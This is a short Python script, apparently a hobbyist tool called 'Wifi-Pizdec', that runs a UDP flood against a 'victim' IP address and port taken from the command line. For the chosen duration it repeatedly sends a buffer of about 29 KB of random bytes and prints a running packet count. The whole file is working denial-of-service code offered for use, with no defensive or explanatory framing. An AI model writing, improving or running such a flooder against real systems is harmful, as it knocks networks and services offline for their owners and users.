import time
import socket
import random
import sys

def usage():
    print("------------------------[Wifi-Pizdec]---------------------")
    print("   Command: python wifi-pizdec.py <ip> <port> <packet>    ")
    print("   Creator: Morrix1337   ")
    print("   Version: 1.0   ")
def flood(victim, vport, duration):
    client = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    bytes = random._urandom(29009)
    timeout =  time.time() + duration
    sent = 99999

    while time.time() < timeout:
        client.sendto(bytes, (victim, vport))
        sent += 1
        print(f"Sended {sent} Packets to host {victim} To Port {vport}")

def main():
    if len(sys.argv) != 4:
        usage()
    else:
        victim = sys.argv[1]
        vport = int(sys.argv[2])
        duration = int(sys.argv[3])
        flood(victim, vport, duration)

if __name__ == '__main__':
    main()
